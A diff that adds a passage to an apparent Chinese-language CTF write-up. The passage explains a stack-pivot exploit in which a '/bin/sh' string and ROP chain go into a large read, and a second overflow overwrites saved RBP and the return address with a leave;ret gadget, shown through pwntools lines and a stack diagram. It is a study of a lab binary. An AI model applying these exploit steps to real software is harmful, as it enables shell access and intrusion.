@@ -83,6 +83,30 @@ int main()
 ![image](https://hackmd.io/_uploads/Sy9l6nb5A.png)
 
 
+第一個 read 的時候因為 size 比較大，固被我們當作塞整串 ROP 的地方
+
+
+```py=
+r.sendlineafter('?','/bin/sh\x00'+p) #/bin/sh\x00 寫到 rdi 上ㄌ
+```
+
+第二個 read 因為空間不夠我們塞，所以是讓我們拿來跳轉到上面那一個 read 的地方
+
+```py=
+r.sendlineafter(':','a'*0x10+name+leave)
+```
+
+Stack 樣子:
+
+```
+               Stack grows down ↓
+
+[ message (0x10 bytes) ]        <- buffer 開頭
+[ saved RBP (8 bytes) ]         <- 被 p64(name) 蓋掉
+[ return address (8 bytes) ]    <- 被 p64(leave_ret) 蓋掉
+
+
+```
 
 ### debug 
 
